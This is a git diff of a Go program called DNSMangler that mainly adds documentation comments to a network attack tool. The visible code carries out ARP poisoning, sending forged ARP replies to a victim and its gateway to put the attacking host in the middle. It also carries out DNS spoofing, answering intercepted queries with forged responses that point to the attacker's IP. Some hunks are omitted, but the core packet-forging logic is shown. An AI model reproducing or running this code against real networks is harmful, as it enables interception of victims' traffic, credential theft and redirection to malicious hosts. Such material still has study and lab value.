@@ -1,5 +1,21 @@
 package main;
+/* main.go
+	PROGRAM: DNSMangler
+	AUTHOR: Ramzi Chennafi
+	DATE: November 5 2015
+	FUNCTIONS:
+		main()
+		arpPoison(targetMAC, gateway, gatewayMAC string)
+		writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet)
+		mangleDNS()
+		craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte
 
+	ABOUT:
+		main.go is the central code body for the DNSMangler funciton, it contains all functions related to spoofing dns.
+
+	USAGE:
+		Type --help for info about the arguments to spoof with.
+*/
 import(
 	"flag"
 	"fmt"
@@ -9,7 +25,6 @@ import(
 	"net"
 	"time"
 )
-
 var (
 	err            error;
 	handle         *pcap.Handle;
@@ -17,7 +32,14 @@ var (
 	macAddr        net.HardwareAddr;
 	target         string
 )
-
+/*
+    FUNCTION: main()
+    RETURNS: Nothing
+    ARGUMENTS: None
+    ABOUT:
+    Grabs incoming arguments and activates the ARP poisoning thread and the DNS spoofing functionality.
+		Also grabs host addresses for use later on and sets global variables.
+*/
 func main(){
 
 	targetPtr := flag.String("targ", "127.0.0.1", "The address of the host for spoofing.");
@@ -43,7 +65,18 @@ func main(){
 	go arpPoison(*targetMAC, *gatewayPtr, *gatewayMAC);
 	mangleDNS();
 }
+/*
+    FUNCTION: arpPoison(targetMAC, gateway, gatewayMAC string){
+    RETURNS: Nothing
+    ARGUMENTS:
+                string targetMAC - the victim mac address for spoofing
+								string gateway - the gateway IP the victim uses
+								string gatewayMAC - the mac address of the gateway the vicitim uses
 
+    ABOUT:
+    Performs arp poisoning of the target machine. Sets its traffic to all come
+		through the host machine, and sets the gateway to redirect its traffic for the victim to this host.
+*/
 func arpPoison(targetMAC, gateway, gatewayMAC string){
 
 	// i lost my mind over this, the parseip function is broke and adds a bucket of worthless
@@ -54,7 +87,9 @@ func arpPoison(targetMAC, gateway, gatewayMAC string){
 	tgm, _ := net.ParseMAC(targetMAC)
 	gwm, _ := net.ParseMAC(gatewayMAC)
 
+	fmt.Print("========================")
 	fmt.Printf("GateWay IP:%s\nTarget IP:%s\nGateway MAC:%s\nTarget MAC:%s\n", gateway, target, gatewayMAC, targetMAC)
+	fmt.Print("========================")
 
 	ethernetPacket := layers.Ethernet{}
 	ethernetPacket.DstMAC = tgm
@@ -68,6 +103,7 @@ func arpPoison(targetMAC, gateway, gatewayMAC string){
 	arpPacket.ProtAddressSize = 4
 	arpPacket.Operation = 2
 
+	//poison the target
 	arpPacket.SourceHwAddress = macAddr
 	arpPacket.SourceProtAddress = gw
 	arpPacket.DstHwAddress = tgm
@@ -76,6 +112,7 @@ func arpPoison(targetMAC, gateway, gatewayMAC string){
 	gwEthernetPacket := ethernetPacket
 	gwARPPacket := arpPacket;
 
+	//poison the gateway
 	gwARPPacket.SourceProtAddress = tg
 	gwARPPacket.DstHwAddress = gwm
 	gwARPPacket.DstProtAddress = gw
@@ -90,7 +127,16 @@ func arpPoison(targetMAC, gateway, gatewayMAC string){
 	}
 
 }
+/*
+    FUNCTION: writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
+    RETURNS: Nothing
+    ARGUMENTS:
+                *layers.ARP arpPacket - the arp packet to write to the line
+                *layers.Ethernet etherPacket - the ethernet packet to write to the line
 
+    ABOUT:
+    Actually writes the arp and ethernet packets used in poisoning to the global handle.
+*/
 func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
 	buf := gopacket.NewSerializeBuffer();
 	opts := gopacket.SerializeOptions{};
@@ -101,7 +147,14 @@ func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
 	err := handle.WritePacketData(packetData[:42]);
 	checkError(err);
 }
-
+/*
+    FUNCTION: mangleDNS(){
+    RETURNS: Nothing
+    ARGUMENTS: None
+    ABOUT:
+    Performs the DNS spoofing against the victims machine. Sets all dns traffic to redirect to the host
+		machines IP address.
+*/
 func mangleDNS(){
 
 	var ethernetLayer layers.Ethernet
@@ -126,7 +179,7 @@ func mangleDNS(){
 		}
 
 		buffer := craftAnswer(&ethernetLayer, &ipLayer, &dnsLayer, &udpLayer)
-		if buffer == nil {
+		if buffer == nil { // if original query was invalid
 			fmt.Print("Buffer error, returned nil.\n")
 			continue
 		}
@@ -136,16 +189,16 @@ func mangleDNS(){
 	}
 }
 /*
-    FUNCTION: handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
-    RETURNS: Nothing
+    FUNCTION: craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte{
+    RETURNS: Byte array containing the spoofed response DNS packet data
     ARGUMENTS:
+								*layers.Ethernet ethernetLayer - the ethernet part of the packet recieved
+								*layers.DNS dnsLayer - the dns part of the packet recieved
                 *layers.IPv4 ipLayer - the ip part of the packet recieved
                 *layers.UDP udpLayer - the udp part of the packet recieved
-                  int port : port to send data to
-                  int lport : port to listen for data on
 
     ABOUT:
-    Performs packet sniffing using gopacket (libpcap).
+    Crafts a spoofed dns packet using the incoming query.
 */
 func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte {
 
@@ -154,6 +207,7 @@ func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer 
 		return nil;
 	}
 
+	//must build every layer to send DNS packets
 	ethMac := ethernetLayer.DstMAC
 	ethernetLayer.DstMAC = ethernetLayer.SrcMAC
 	ethernetLayer.SrcMAC = ethMac
